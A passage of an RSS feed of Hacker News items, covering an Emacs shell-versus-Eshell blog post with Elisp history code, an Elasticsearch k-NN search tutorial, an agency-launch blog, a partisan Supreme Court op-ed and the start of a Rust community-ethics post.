As mentioned above, <code>M-x shell</code> does not have an equivalent to
<code>eshell-post-command-hook</code> which makes it impossible to use it for
<code>helm-system-package</code>.
</p>
</div>

<div id="outline-container-org4d67552">
<h2 id="org4d67552">Extra syntax highlighting (fontification)</h2>
<div id="text-org4d67552">
<p>
Comint-mode, the major mode behind <code>M-x shell</code>, supports extra fontification by
default.  For instance, running
</p>



<p>
prints the network interfaces in a different colour.  Neat, isn’t it?
</p>
</div>
</div>

<div id="outline-container-org9f48a0b">
<h2 id="org9f48a0b">Helm “Switch to shell”</h2>
<div id="text-org9f48a0b">
<p>
One of the features I use the most is the “Switch to to Eshell” action from
<code>helm-find-files</code>.  Until recently, it only supported Eshell.
</p>

<p>
This is now fixed in <a href="https://github.com/emacs-helm/helm/commit/6061a3af5139491d7811c86d7c9cd5fec8f5fb40">Helm 3.6.3</a> and I just had to add this to my initialization
file:
</p>

<div>
<pre>(setq helm-ff-preferred-shell-mode 'shell-mode)
</pre>
</div>

<p>
I can now quickly fuzzy-search and switch to the directly I want without ever
typing a single <code>cd</code> command.
</p>
</div>
</div>

<div id="outline-container-org001323f">
<h2 id="org001323f">Narrow-to-prompt</h2>
<div id="text-org001323f">
<p>
A very convenient Emacs command is <code>narrow-to-defun</code> (<code>C-x n d</code>): it focuses the
buffer on a single function definition and all buffer-global commands are
restricted to it.  For instance, if I want to replace all occurrences of <code>foo</code>
in a given function, without altering the other <code>foo</code> in the rest of the buffer,
I can first narrow to the function, then run <code>query-replace</code> over all visible
occurrences.
</p>

<p>
I wanted to do the same with shells.  Indeed, it’s very useful to be able to
restrict commands to the output of a given command, say, to search an output
without hitting matches from other outputs in the same buffer.
</p>

<p>
I wrote an implementation both for <a href="https://gitlab.com/ambrevar/dotfiles/-/blob/adce533dc244f3e4fd5c146172eb48981c73b5b2/.emacs.d/lisp/init-eshell.el#L312">Eshell</a> and <a href="https://gitlab.com/ambrevar/dotfiles/-/blob/adce533dc244f3e4fd5c146172eb48981c73b5b2/.emacs.d/lisp/init-shell.el#L84"><code>M-x shell</code></a>.
</p>
</div>
</div>

<div id="outline-container-orgcba5c0f">
<h2 id="orgcba5c0f">Browsing prompts</h2>
<div id="text-orgcba5c0f">
<p>
It’s useful to search prompts, maybe to copy a command or to consult its output
again.
</p>

<p>
Helm can fuzzy-search and browse the prompts of all shell (including Eshell)
buffers with <code>helm-comint-prompts-all</code> and <code>helm-eshell-prompts-all</code>.
</p>
</div>
</div>

<div id="outline-container-orgf33f22a">
<h2 id="orgf33f22a">Global, filtered history</h2>
<div id="text-orgf33f22a">
<p>
More often than not, we use multiple shells.  By default, the shell history is
not synchronized between the shells and, worse, it gets overwritten by the <code>M-x
shell</code> that was last closed, which means that all previously closed shell
histories are gone.
</p>

<p>
It’s possible to fix this issue with the right shell setup (e.g. see
<a href="https://unix.stackexchange.com/questions/1288/preserve-bash-history-in-multiple-terminal-windows">this discussion</a> for Bash) but it’s limited and it’s not general enough since it
must be done for all shell sub-programs, when supported at all.
</p>

<p>
A better approach is to ignore the underlying shell history and use Emacs
capabilities.  Eshell has the same limitations by default which I had fixed with
some custom Elisp, so I just ported it to <code>comint-mode</code> and voilà!
</p>

<p>
While I was at it, I’ve also applied history filtering such as removing <i>all</i>
duplicates (not just when last command matches the last history entry) and other
undesirable commands, such as <code>cd ...</code> or commands starting with a space.
</p>

<div>
<pre>(defun ambrevar/ring-delete-first-item-duplicates (ring)
  "Remove duplicates of last command in history.
Return RING.

Unlike `eshell-hist-ignoredups' or `comint-input-ignoredups', it
does not allow duplicates ever.  Surrounding spaces are ignored
when comparing."
  (let ((first (ring-ref ring 0))
	(index 1))
    (while (&lt;= index (1- (ring-length ring)))
      (if (string= (string-trim first)
		   (string-trim (ring-ref ring index)))
	  ;; We don't stop at the first match so that from an existing history
	  ;; it cleans up existing duplicates beyond the first one.
	  (ring-remove ring index)
	(setq index (1+ index))))
    ring))

(defvar ambrevar/shell-history-global-ring nil
  "The history ring shared across shell sessions.")

(defun ambrevar/shell-use-global-history ()
  "Make shell history shared across different sessions."
  (unless ambrevar/shell-history-global-ring
    (when comint-input-ring-file-name
      (comint-read-input-ring))
    (setq ambrevar/shell-history-global-ring (or comint-input-ring (make-ring comint-input-ring-size))))
  (setq comint-input-ring ambrevar/shell-history-global-ring))

(defun ambrevar/shell-history-remove-duplicates ()
  (require 'functions) ; For `ambrevar/ring-delete-first-item-duplicates'.
  (ambrevar/ring-delete-first-item-duplicates comint-input-ring))

(defvar ambrevar/comint-input-history-ignore (concat "^" (regexp-opt '("#" " " "cd ")))
  "`comint-input-history-ignore' can only be customized globally
because `comint-read-input-ring' uses a temp buffer.")

(defun ambrevar/shell-remove-ignored-inputs-from-ring ()
  "Discard last command from history if it matches
`ambrevar/comint-input-history-ignore'."
  (unless (ring-empty-p comint-input-ring)
    (when (string-match ambrevar/comint-input-history-ignore
			(ring-ref comint-input-ring 0))
      (ring-remove comint-input-ring 0))))

(defun ambrevar/shell-sync-input-ring (_)
  (ambrevar/shell-history-remove-duplicates)
  (ambrevar/shell-remove-ignored-inputs-from-ring)
  (comint-write-input-ring))

(defun ambrevar/shell-setup ()
  (setq comint-input-ring-file-name
	(expand-file-name "shell-history" user-emacs-directory))
  (ambrevar/shell-use-global-history)

  ;; Write history on every command, not just on exit.
  (add-hook 'comint-input-filter-functions 'ambrevar/shell-sync-input-ring nil t))

(add-hook 'shell-mode-hook 'ambrevar/shell-setup)
</pre>
</div>
</div>
</div>

<div id="outline-container-org9e4cab1">
<h2 id="org9e4cab1">Emacs integration</h2>
<div id="text-org9e4cab1">
<p>
One of the benefits of Eshell is that it integrates shell commands with Emacs.
For instance, running <code>grep</code> will display an interactive result in an Emacs
buffer.
</p>

<p>
It’s possible to write an <code>emacsclient</code> wrapper that evaluates the command
passed as argument in an Emacs buffer to, so it’s possible to mimic this feature
of Eshell rather closely.
</p>

<p>
Still, this is not as closely integrated to Emacs as it could get.  Indeed,
Eshell can intertwine its shell language with Elisp.  It’s thus able to run any
Elisp function.
</p>

<p>
Maybe a good direction to explore is <a href="http://howardism.org/Technical/Emacs/piper-presentation-transcript.html">piper</a>.
</p>
</div>
</div>

<div id="outline-container-org765e69b">
<h2 id="org765e69b">Conclusion</h2>
<div id="text-org765e69b">
<p>
I’m happy with <code>M-x shell</code>, the everyday use is much smoother than that of
Eshell.  Performance being one of the biggest selling point in my experience.
</p>

<p>
Overall, with the support of few packages such as Helm and <code>helm-fish-completion</code>
I get a stellar shell experience.  I miss very few features, such as support for
“visual” commands, modifiers and predicates which I rarely use.
</p>
</div>
</div>
</div><div id="postamble">

<p>Date: 2020-06-26 (<a href="https://gitlab.com/ambrevar/ambrevar.gitlab.io/commits/master/source/emacs-eshell-versus-shell/index.org">Last update: 2020-07-12</a>)</p>
<p>Made with <a href="https://www.gnu.org/software/emacs/">Emacs</a> 26.1 (<a href="https://orgmode.org/">Org</a> mode 9.1.9)</p>
<p>
  <a rel="license" href="http://creativecommons.org/licenses/by-sa/4.0/"><img alt="Creative Commons License" src="https://i.creativecommons.org/l/by-sa/4.0/88x31.png"></a>
</p>
</div></div>]]>
            </description>
            <link>https://ambrevar.xyz/emacs-eshell-versus-shell/index.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24547400</guid>
            <pubDate>Mon, 21 Sep 2020 19:26:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Build K-Nearest Neighbor (K-NN) Similarity Search Engine with Elasticsearch]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24547398">thread link</a>) | @gk1
<br/>
September 21, 2020 | https://opendistro.github.io/for-elasticsearch/blog/odfe-updates/2020/04/Building-k-Nearest-Neighbor-(k-NN)-Similarity-Search-Engine-with-Elasticsearch/ | <a href="https://web.archive.org/web/*/https://opendistro.github.io/for-elasticsearch/blog/odfe-updates/2020/04/Building-k-Nearest-Neighbor-(k-NN)-Similarity-Search-Engine-with-Elasticsearch/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>Recently, we launched k-NN similarity search feature on Open Distro for Elasticsearch. We are excited for the community to try out this feature and welcome you to come join in and contribute in building additional capabilities into Open Distro for Elasticsearch.</p>

<p>A k-nearest neighbors (k-NN) algorithm is a technique for performing similarity search: given a query data point, what are the k data points in an index that are most similar to the query? k-NN is largely popular for its use in content-based recommendation systems. For example, in a music streaming service, when a user generates an on-demand playlist, the recommendation system adds the songs that match the attributes of that playlist using k-NN. In a k-NN search algorithm, the elements of a data set are represented by vectors. Each song is a vector, containing several dimensions (attributes) like artist, album, genre, year of release, etc. The search assumes you have a defined distance function between the data elements (vectors) and returns most similar items to the one provided as input, where closest distance translates to item similarity. Other use cases with similarity search include fraud detection, image recognition, and semantic document retrieval.</p>

<p>We evaluated four primary dimensions to measure the effectiveness of a k-NN algorithm:</p>

<ol>
  <li><strong>Speed</strong> - How quickly does the algorithm return the approximate k-nearest neighbors, measured in latency of a single or batch query?</li>
  <li><strong>Recall</strong> - How accurate are the results, measured by ratio of the returned k-nearest neighbors indeed in the list of the actual k nearest neighbors to the value of k?</li>
  <li><strong>Scalability</strong> - Can the algorithm handle data sets with millions or billions of vectors and thousands of dimensions?</li>
  <li><strong>Updates</strong> - Does the algorithm allow addition, deletion, and updating points without having to rebuild an index, a process that can take hours or more?</li>
</ol>

<p>We selected “<a href="https://arxiv.org/pdf/1603.09320.pdf"><strong>Hierarchical Navigable Small World</strong></a>” (HNSW) graphs developed under the open source library “<strong>Non-Metric Space Library</strong>” (<a href="https://github.com/nmslib/nmslib">NMSLIB</a>) as it aligned with our architectural requirements and met most of our evaluation criteria. Given a dataset, the algorithm constructs a graph on the data such that the greedy search algorithm finds the approximate nearest neighbor to a query in logarithmic time. HSNW consistently outperforms other libraries in this space based on <a href="https://github.com/erikbern/ann-benchmarks">ANN benchmark</a> metrics. HNSW excels at speed, recall, and cost, though it is restricted in scalability and updates. While the HNSW algorithm allows incremental addition of points, it forbids deletion and modification of indexed points. We offset the scalability and updates challenges by leveraging Elasticsearch’s distributed architecture, which scales with large data sets and inherently supports incremental updates to the data sets that become available in the search results in near real-time. The rest of this post discusses the integration of NMSLIB with Elasticsearch and the customizations made to support the feature in Elasticsearch.</p>

<h2 id="hierarchical-navigable-small-world-algorithm-hnsw">Hierarchical Navigable Small World Algorithm (HNSW)</h2>

<p>The HNSW graph algorithm is a fast and accurate solution to the approximate k-nearest neighbors (k-NN) search problem.</p>

<p>A straightforward, yet naive solution to the k-NN problem is to first compute the distances from a given query point to every data point within an index and then select the data points with the smallest k distances to the query. While this approach is effective when the index contains ten thousand or fewer data points, it does not scale to the sizes of datasets used by our customers. An approximate k-NN (ANN) algorithm may greatly reduce search latency at the cost of precision. When designing an ANN algorithm there are two general approaches to improve latency:</p>

<ol>
  <li>Compute fewer distances and</li>
  <li>Make distance computations cheaper</li>
</ol>

<p>The HNSW algorithm focuses on the first of these approaches by building a graph data structure on the constituent points of the data set.</p>

<p>With a graph data structure on the data set, approximate nearest neighbors can be found using graph traversal methods. Given a query point, we find its nearest neighbors by starting at a random point in the graph and computing its distance to the query point. From this entry point, we explore the graph, computing the distance to the query of each newly visited data point until the traversal can find no closer data points. To compute fewer distances while still retaining high accuracy, the HNSW algorithm builds on top of previous work on Navigable Small World (NSW) graphs. The NSW algorithm builds a graph with two key properties. The “small world” property is such that the number of edges in the shortest path between any pair of points grows poly-logarithmically with the number of points in the graph. The “navigable” property asserts that the greedy algorithm is likely to stay on this shortest path. Combining these two properties results in a graph structure so the greedy algorithm is likely to find the nearest data point to a query in logarithmic time.</p>

<p><img src="https://opendistro.github.io/for-elasticsearch/assets/media/blog-images/knn_graph_1.png" alt="k-NN Graph Figure 1"></p>
<p>
<i>Figure 1: A depiction of an NSW graph built on blue data points. The dark blue edges represent long-range connections that help ensure the small-world property. Starting at the entry point, at each iteration the greedy algorithm will move to the neighbor closest to the query point. The chosen path from the entry point to the query’s nearest neighbor is highlighted in magenta and, by the “navigable” property, is likely to be the shortest path from the entry point to the query’s nearest neighbor.
</i></p>

<p>HNSW extends the NSW algorithm by building multiple layers of interconnected NSW-like graphs. The top layer is a coarse graph built on a small subset of the data points in the index. Each lower layer incorporates more points in its graph until reaching the bottom layer, which consists of an NSW-like graph on every data point. To find the approximate nearest neighbors to a query, the search process finds the nearest neighbors in the graph at the top layer and uses these points as the entry points to the subsequent layer. This strategy results in a nearest neighbors search algorithm which runs logarithmically with respect to the number of data points in the index.</p>

<h3 id="non-metric-space-library-nmslib">Non Metric Space Library (NMSLIB)</h3>

<p>NMSLIB, an Apache 2 licensed library, is the open source implementation of HNSW. It is lightweight and works particularly well for our use cases that that requires minimal impact on the Elasticsearch application workloads. To index the vectors and to query the nearest neighbors for the given query vector, our k-NN plugin makes calls to the NMSLIB implementation of HNSW. We use the Java Native Interface (JNI) to bridge between Elasticsearch written in Java and C++ libraries in NMSLIB.  Although we use Euclidean distance vector to calculate the proximity, NMSLIB can be easily extended to add new search methods and distance functions (like cosine similarity) in the future.</p>

<h2 id="elasticsearch-integration-with-approximate-k-nn-search">Elasticsearch Integration with Approximate k-NN Search</h2>

<p>Elasticsearch’s distributed engine allows us to distribute the millions of vectors across multiple shards spread across multiple nodes within a cluster and scales horizontally as the data grows. Users can also take advantage of Elasticsearch’s support for index updates to make any modifications to the data set and reflect the changes in the results in near real-time. While Elasticsearch’s plugin-based architecture makes it easy to add extensions, we had to make some customizations to support the Approximate Nearest Neighbor (ANN) Search.</p>

<p>First, we added a new field type, <strong>knn_vector</strong>, using the Mapper plugin, to represent the vectors as a an array of floating point numbers in a document. ANN requires support for storing high cardinality vectors. The <strong>knn_vector</strong> field support vectors up to 10k dimensions. We also introduced a new Apache Lucene codec, <strong>KNNCodec</strong>, to add a new index file format for storing and retrieving the vectors and make Apache Lucene aware of the graphs built by NMSLIB. These file formats co-exist with the other Apache Lucene file formats and are immutable just like the other Apache Lucene files, making them file system cache friendly and thread safe.</p>

<p>Let’s create a KNN index <strong>myindex</strong> and add data of type knn_vector to the field my_vector. You could then index your documents as you would normally do using any of Elasticsearch index APIs.</p>

<div><div><pre><code><span>PUT</span><span> </span><span>/myindex</span><span>
</span><span>{</span><span>
  </span><span>"settings"</span><span>:</span><span> </span><span>{</span><span>
    </span><span>"index.knn"</span><span>:</span><span> </span><span>true</span><span>
  </span><span>},</span><span>
  </span><span>"mappings"</span><span>:</span><span> </span><span>{</span><span>
    </span><span>"properties"</span><span>:</span><span> </span><span>{</span><span>
      </span><span>"my_vector"</span><span>:</span><span> </span><span>{</span><span>
        </span><span>"type"</span><span>:</span><span> </span><span>"knn_vector"</span><span>,</span><span>
        </span><span>"dimension"</span><span>:</span><span> </span><span>2</span><span>
      </span><span>}</span><span>
    </span><span>}</span><span>
  </span><span>}</span><span>
</span><span>}</span><span>

</span></code></pre></div></div>

<div><div><pre><code><span>PUT</span><span> </span><span>/myindex/_doc/</span><span>1</span><span>
</span><span>{</span><span>
  </span><span>"my_vector"</span><span>:</span><span> </span><span>[</span><span>1.5</span><span>,</span><span> </span><span>2.5</span><span>]</span><span>
</span><span>}</span><span>

</span><span>PUT/myindex/_doc/</span><span>2</span><span>
</span><span>{</span><span>
  </span><span>"my_vector"</span><span>:</span><span> </span><span>[</span><span>2.5</span><span>,</span><span> </span><span>3.5</span><span>]</span><span>
</span><span>}</span><span>
</span></code></pre></div></div>

<p>We also added a new query clause <code>knn</code>. You can use the this clause in the query DSL and specify the point of interest as my_vector (knn_vector) and the number of nearest neighbors to fetch as ‘k’. The response below, which shows 2 nearest docs as defined by k to the input point [3, 4]. The score indicates the distance between the two vectors and is the deciding factor for selecting the neighbors.</p>

<div><div><pre><code><span>POST</span><span> </span><span>/myindex/_search</span><span>
</span><span>{</span><span>
  </span><span>"size"</span><span>:</span><span> </span><span>2</span><span>,</span><span>
  </span><span>"query"</span><span>:</span><span> </span><span>{</span><span>
    </span><span>"knn"</span><span>:</span><span> </span><span>{</span><span>
      </span><span>"my_vector"</span><span>:</span><span> </span><span>{</span><span>
        </span><span>"vector"</span><span>:</span><span> </span><span>[</span><span>3</span><span>,</span><span> </span><span>4</span><span>],</span><span>
        </span><span>"k"</span><span>:</span><span> </span><span>2</span><span>
      </span><span>}</span><span>
    </span><span>}</span><span>
  </span><span>}</span><span>
</span><span>}</span><span>

</span><span>Output:</span><span>

</span><span>{</span><span>
  </span><span>"took"</span><span>:</span><span> </span><span>7</span><span>,</span><span>
  </span><span>"timed_out"</span><span>:</span><span> </span><span>false</span><span>,</span><span>
  </span><span>"_shards"</span><span>:</span><span> </span><span>{</span><span>
    </span><span>"total"</span><span>:</span><span> </span><span>5</span><span>,</span><span>
    </span><span>"successful"</span><span>:</span><span> </span><span>5</span><span>,</span><span>
    </span><span>"skipped"</span><span>:</span><span> </span><span>0</span><span>,</span><span>
    </span><span>"failed"</span><span>:</span><span> </span><span>0</span><span>
  </span><span>},</span><span>
  </span><span>"hits"</span><span>:</span><span> </span><span>{</span><span>
    </span><span>"total"</span><span>:</span><span> </span><span>{</span><span>
      </span><span>"value"</span><span>:</span><span> </span><span>2</span><span>,</span><span>
      </span><span>"relation"</span><span>:</span><span> </span><span>"eq"</span><span>
    </span><span>},</span><span>
    </span><span>"max_score"</span><span>:</span><span> </span><span>0.5857864</span><span>,</span><span>
    </span><span>"hits"</span><span>:</span><span> </span><span>[{</span><span>
        </span><span>"_index"</span><span>:</span><span> </span><span>"myindex"</span><span>,</span><span>
        </span><span>"_type"</span><span>:</span><span> </span><span>"_doc"</span><span>,</span><span>
        </span><span>"_id"</span><span>:</span><span> </span><span>"2"</span><span>,</span><span>
        </span><span>"_score"</span><span>:</span><span> </span><span>0.5857864</span><span>,</span><span>
        </span><span>"_source"</span><span>:</span><span> </span><span>{</span><span>
          </span><span>"my_vector"</span><span>:</span><span> </span><span>[</span><span>
            </span><span>2.5</span><span>,</span><span>
            </span><span>3.5</span><span>
          </span><span>]</span><span>
        </span><span>}</span><span>
      </span><span>},</span><span>
      </span><span>{</span><span>
        </span><span>"_index"</span><span>:</span><span> </span><span>"myindex"</span><span>,</span><span>
        </span><span>"_type"</span><span>:</span><span> </span><span>"_doc"</span><span>,</span><span>
        </span><span>"_id"</span><span>:</span><span> </span><span>"1"</span><span>,</span><span>
        </span><span>"_score"</span><span>:</span><span> </span><span>0.32037726</span><span>,</span><span>
        </span><span>"_source"</span><span>:</span><span> </span><span>{</span><span>
          </span><span>"my_vector"</span><span>:</span><span> </span><span>[</span><span>
            </span><span>1.5</span><span>,</span><span>
            </span><span>2.5</span><span>
          </span><span>]</span><span>
        </span><span>}</span><span>
      </span><span>}</span><span>
    </span><span>]</span><span>
  </span><span>}</span><span>
</span><span>}</span><span>
</span></code></pre></div></div>

<p>You can also combine the <code>knn</code> query clause with other query clauses as you would normally do with compound queries. …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://opendistro.github.io/for-elasticsearch/blog/odfe-updates/2020/04/Building-k-Nearest-Neighbor-(k-NN)-Similarity-Search-Engine-with-Elasticsearch/">https://opendistro.github.io/for-elasticsearch/blog/odfe-updates/2020/04/Building-k-Nearest-Neighbor-(k-NN)-Similarity-Search-Engine-with-Elasticsearch/</a></em></p>]]>
            </description>
            <link>https://opendistro.github.io/for-elasticsearch/blog/odfe-updates/2020/04/Building-k-Nearest-Neighbor-(k-NN)-Similarity-Search-Engine-with-Elasticsearch/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24547398</guid>
            <pubDate>Mon, 21 Sep 2020 19:25:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Covid-19 Open Data Explorer]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24547371">thread link</a>) | @doener
<br/>
September 21, 2020 | https://open-covid-19.github.io/explorer/ | <a href="https://web.archive.org/web/*/https://open-covid-19.github.io/explorer/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://open-covid-19.github.io/explorer/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24547371</guid>
            <pubDate>Mon, 21 Sep 2020 19:24:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Launch your Agency and not get hung up on stuff that doesn't matter]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24547345">thread link</a>) | @entreprenerd
<br/>
September 21, 2020 | https://www.entreprenerd.blog/live-streams/how-to-launch-an-agency | <a href="https://web.archive.org/web/*/https://www.entreprenerd.blog/live-streams/how-to-launch-an-agency">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>In the beginning, an agency is incredibly simple. There are only two things you need: A website and marketable skills.&nbsp;</p><p>This is because an agency is a service-based business - so you're essentially trading time, and your expertise, for payment. It's just freelancing - the only difference I can find is that there's a legal business entity, or there's a number of people greater than 1 involved.</p><p>But, in the beginning, you just need yourself, a small way to show people you exist, and your skillset.</p><p>So, let's build that website. To start, give your agency a name, you can change it later if you make it big.&nbsp;<strong>Your name doesn't matter.&nbsp;</strong>Mine is "UnnamedAgency.com" because I thought it was funny, and we've already worked with a client. Don't overthink it.</p><p>Now make a logo. I spent 6 minutes in <a href="http://www.canva.com/">Canva</a> making mine, then put it through <a href="http://www.remove.bg/">remove.bg</a> to remove the background -&nbsp;<strong>you can change it later.</strong>&nbsp;I typed out the word "Unnamed", moved the letters up and down, and added a base shadow effect. Don't overthink it.</p><p>Now you need to establish what you're offering. It does not need to be unique. It likely will not be, and that is fine, but you still need to solve a problem like any other business.&nbsp;</p><p>So - I live stream. I noticed a lot of live streamers in my network weren't using and clips of their live streams on social media, even though all their live streams are awesome pieces of long-form material. Most of the successful live streamers would do it, but other, usually smaller ones wouldn't. I personally have an editor chop up my live streams, because watching through them, finding the best parts, and clipping them together takes hours and hours. It's not hard, it's just very time consuming, and you need to know a little bit about what works on social media. But that's the problem we're going to solve.</p><p>Our agency will help live streamers by finding quality content in their long-form streams and then by breaking it up into digestible clips. Great. I spent half an hour boiling down the tagline to "we transform live streams and podcasts into engaging clips". I figured we should include podcasts - as they're just as easy to edit and the content format is similarly long-form.</p><p>There are probably thousands of other freelancers or agencies that do this, but it doesn't matter. They don't have my network.</p><p>Now you need a section of the website that discusses the problem, and how you can help. I can't tell you how to do this, but it shouldn't take you long. I used a stock social media graphic and I designed a crummy little diagram in Canva to add to this section.</p><p>Now, if you've done some work for a client already, add an example or screenshot to show it exists. Awesome - now just a small professionally branded email and a "schedule a call" button linked to a <a href="http://www.calendly.com/">Calendly</a> or whatever else you use.</p><p>FYI, I used <a href="http://www.carrd.co/">Carrd</a>, a super cheap, simple one-page website builder. You don't need extra functionality. You can change your website later. Don't overthink it.</p><p>You're done. That's the easy part. Now you have to find clients. That's the hard part, and it depends a lot on the service you provide. But for my agency, I'm going to message every live streamer I see that isn't clipping their long-form content. I'm going to ask if I can do one or two live stream edits for free if the streamer has a decent network and is willing to promote what I'm building. I'm going to call similar agency owners and ask for their advice. (why not?)</p><p>Don't do free work for long, if you have to do it at all. Price yourself based on the market - for instance, I would ask live streamers that already outsource their editing how much they're already paying. You don't have to be cheaper, you just have to do a good job and not wildly overprice your work. You can customize payment to each client you find, and you likely will to start. You'll eventually standardize later, don't worry about it right now.</p><p>Link your agency to your social profiles, make a LinkedIn page for it, tell all your friends and your LinkedIn network that you've set it up, and start reaching out to potential clients to see if you can find anyone that might be a fit.</p><p>That's it. The initial setup process shouldn't take you more than a day. I almost finished it on a 90-minute live stream. Finding clients will be an ongoing process, but you don't have to rush it. Set a reminder every day to find one new person to reach out to, or one new sales tactic to try. Be consistent and steady. Once you get your first client and your first testimonial, you'll be able to begin scaling up - just don't stress about the setup.</p><p>‍</p><p>I hope you learned something. :) If you think this was valuable, a retweet helps me spread the word, and I would super appreciate it.</p></div></div>]]>
            </description>
            <link>https://www.entreprenerd.blog/live-streams/how-to-launch-an-agency</link>
            <guid isPermaLink="false">hacker-news-small-sites-24547345</guid>
            <pubDate>Mon, 21 Sep 2020 19:22:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[They want to steal this seat for a reason]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24547331">thread link</a>) | @nabeards
<br/>
September 21, 2020 | https://the.ink/p/they-want-to-steal-this-seat-for | <a href="https://web.archive.org/web/*/https://the.ink/p/they-want-to-steal-this-seat-for">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><em>Welcome to The.Ink. If you’re joining us for the first time, hello! Click the orange button below to get this in your inbox. And if you’ve been with us for a time, welcome back! Please consider becoming a paid subscriber to support this work.</em></p><h3>The why of it</h3><p><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F95670a64-675b-4b7c-9142-b002f803fd2d_4528x3168.jpeg"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F95670a64-675b-4b7c-9142-b002f803fd2d_4528x3168.jpeg" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/95670a64-675b-4b7c-9142-b002f803fd2d_4528x3168.jpeg&quot;,&quot;height&quot;:1019,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:9073324,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/jpeg&quot;,&quot;href&quot;:null}" alt=""></a></p><p>The fight to replace the late Justice Ruth Bader Ginsburg isn’t just a fight over the Supreme Court and the trajectory of the law. It’s a fight over what your days are like.</p><p>You want your feet to hurt less at the end of the day. They want to crush the union fighting for your breaks to be longer and your pay to be higher. That’s why they want to steal this seat.</p><p>You want to wake up in the morning thinking about the business you’re going to start. They want you to wake up in the middle of the night sweating about the health benefits you’d lose if you did, so that you keep working for them. That’s why they’re desperate to steal this seat.</p><p>You want to learn what you need to be a good citizen and get ahead in a tough economy. They want you balled and chained with debt, paying them interest forever. That’s why they will do anything to steal this seat.</p><p>You want to bring life into this world when it’s the right moment for you and your family. They want to control your body to buy the votes of certain religious people so that their tax cuts benefiting many fewer people can pass. That’s why they will violate their own past vows to steal this seat.</p><p>You want to help decide the future of your country and you’re willing to stand in line for it because you know how much more others sacrificed for the vote. They want you to jump through hoops for your suffrage so that the things most people want continue to be elusive. That’s why they will lie to steal this seat.</p><p>You want to be sure your president is working for you and no one else. They want you to lack even basic records about whom your president is paid by and whom your president owes. That’s why they will rationalize anything to steal this seat.</p><p>You want your children to be better off than you were. They want to pay your children the same wage you were paid, and not even raised for inflation. That’s why they will debase themselves to steal this seat.</p><p>You want to live in a vibrant community full of stores offering affordable prices. They want you to have no choices, depending on monopolies that can charge you whatever they want. That’s why they will skip proper vetting to steal this seat.</p><p>You want to be judged at work and at school by your character, by how hard you try, by your helpfulness to others. They want you to be condemned for your color, your choice of whom to love, the truth of what you know you are. That’s why they will defy its last occupant’s dying wish to steal this seat.</p><p>Don’t let them steal this seat.</p></div></div>]]>
            </description>
            <link>https://the.ink/p/they-want-to-steal-this-seat-for</link>
            <guid isPermaLink="false">hacker-news-small-sites-24547331</guid>
            <pubDate>Mon, 21 Sep 2020 19:21:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Rust 2021 – Ethical Development]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24547276">thread link</a>) | @llogiq
<br/>
September 21, 2020 | https://llogiq.github.io/2020/09/21/ethics.html | <a href="https://web.archive.org/web/*/https://llogiq.github.io/2020/09/21/ethics.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<header></header>
<section>
<article>
  
  <p>
    <time datetime="2020-09-21 00:00:00 +0000">
      21 September 2020
    </time>
  </p>

  <p>This is my Rust 2021 post. I believe that Rust has shown that “bending the curve” is
both possible and fruitful in programming language design. We also have a strong set
of values as a community, enshrined both in the <a href="https://www.rust-lang.org/policies/code-of-conduct">Code of Conduct</a> and the example of
various high-profile rustaceans.</p>

<p>For 2021 I really couldn’t care less what features go into the next edition. Don’t
get me wrong, I want the next edition to be awesome, but I believe this is table
stakes by now. I want us to take on the harder problems.</p>

<p>I want us to grow as a community, and I don’t mean that in a population count sense.
This is what I meant when I snarkily wrote “Less doing the wrong thing, safely”. The
keyword here is <em>ethical development</em>. Just like the Rust programming language has a
set of vaues, a set of tradeoffs between them, and a set of bent curves where we
found a place in the design space that lets us have our cake and eat it where this
was a formerly accepted tradeoff, I want the Rust community to have a shared set of
values, a shared set of tradeoffs between them, and as much bent curves as possible.</p>

<p>Now what I mean by ‘values’ obviously differs when I talk about programming language
design or a programming language community. For language design, the values can
contain execution speed, productivity, safety, learnability and so on. For software
ethics values may be inclusion and diversity, welfare for all people, privacy,
freedom, lawfulness, friendlyness and hospitality, integrity, humor, and a lot more.
Some of them are by now well-known and have seen implementations, for example
privacy. But how might we hope to encode e.g. hospitality?</p>

<p>There are a few hard questions to ask, and I won’t cover everything here, but I’ll
give you a few examples of things the Rust community will have to face at some
point:</p>

<ul>
  <li>I have heard reports of companies treating their Rust developers badly. As if
using Rust should make up for abuse by an employer. This is obviously unacceptable,
